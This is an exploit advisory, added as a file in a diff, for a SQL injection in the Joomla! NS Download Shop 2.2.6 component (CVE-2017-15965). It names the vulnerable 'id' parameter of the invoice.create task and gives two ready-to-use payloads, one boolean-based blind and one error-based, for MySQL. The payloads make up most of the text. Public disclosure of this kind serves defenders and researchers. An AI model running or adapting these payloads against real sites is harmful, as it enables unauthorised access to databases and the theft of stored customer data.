@@ -1,0 +1,34 @@
+# # # # # 
+# Exploit Title: Joomla! Component NS Download Shop 2.2.6 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: https://nswd.co/
+# Software Link: https://extensions.joomla.org/extensions/extension/e-commerce/paid-downloads/ns-downloadshop/
+# Demo: https://ds.nswd.co/
+# Version: 2.2.6
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15965
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 	
+# Proof of Concept:
+# 
+# http://localhost/[PATH]/index.php?option=com_ns_downloadshop&task=invoice.create&id=[SQL]
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: MySQL >= 5.0 boolean-based blind - Parameter replace
+#     Payload: option=com_ns_downloadshop&task=invoice.create&id=(SELECT (CASE WHEN (5078=5078) THEN 5078 ELSE 5078*(SELECT 5078 FROM INFORMATION_SCHEMA.PLUGINS) END))
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+#     Payload: option=com_ns_downloadshop&task=invoice.create&id=(SELECT 2458 FROM(SELECT COUNT(*),CONCAT(0x716b626a71,(SELECT (ELT(2458=2458,1))),0x7178627671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 	
+# Etc..
+# # # # #
